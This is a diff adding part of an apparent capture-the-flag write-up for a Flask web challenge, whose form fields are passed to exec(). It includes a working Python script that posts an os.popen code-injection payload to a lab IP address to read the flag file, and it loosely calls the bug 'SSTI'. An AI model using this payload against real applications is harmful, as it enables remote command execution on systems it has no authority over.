@@ -88,3 +88,64 @@ if __name__ == '__main__':
 7. Notice there's a `calc()` function which can be our attack vector, also there's `exec()` function which executes python script injected at the recipe variable.
 8. Based from the script, when we perform a `POST` request, we are accessing this part of code.
 
+```
+if request.method == 'POST':
+			ingredient = request.form.get('ingredient', '')
+			recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))
+```
+
+9. Based on this part of code, we know that the webapp extracts value from ingredient variable and measurements variable from request body. Means we can utilize that to send maliciou recipe.
+10. So let's make a script to send our request.
+
+> THE SCRIPT
+
+```py
+import requests 
+import os
+
+os.system('clear')
+recipe = {'ingredient': 'flag', 'measurements': '__import__("os").popen("cat flag").read()'}
+host = 'http://138.68.185.149:31457'
+result = requests.post(host, data=recipe)
+    
+print(result.content)
+```
+
+> NOTES
+
+##### I input the ingredient value as `flag`, because the ingredient accept lowercase character.
+
+```py
+ingredient = request.form.get('ingredient', '')
+```
+
+```py
+ingredient = ''.join(choice(lowercase) for _ in range(10))
+```
+
+##### Next we can utilize the measurements value to do flask SSTI.
+
+```py
+recipe = '%s = %s' % (ingredient, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)])))
+```
+
+> RECIPE RESULT 
+
+```
+'flag = __import__("os").popen("cat flag").read()
+```
+
+11. Run the script.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/209682949-436c4208-fb27-45a9-ad68-f02fb9bc1038.png)
+
+
+12. Got the flag!
+
+## FLAG
+
+```
+HTB{n3v3r_trust1ng_us3r_1nput_ag41n_1n_my_l1f3}
+```
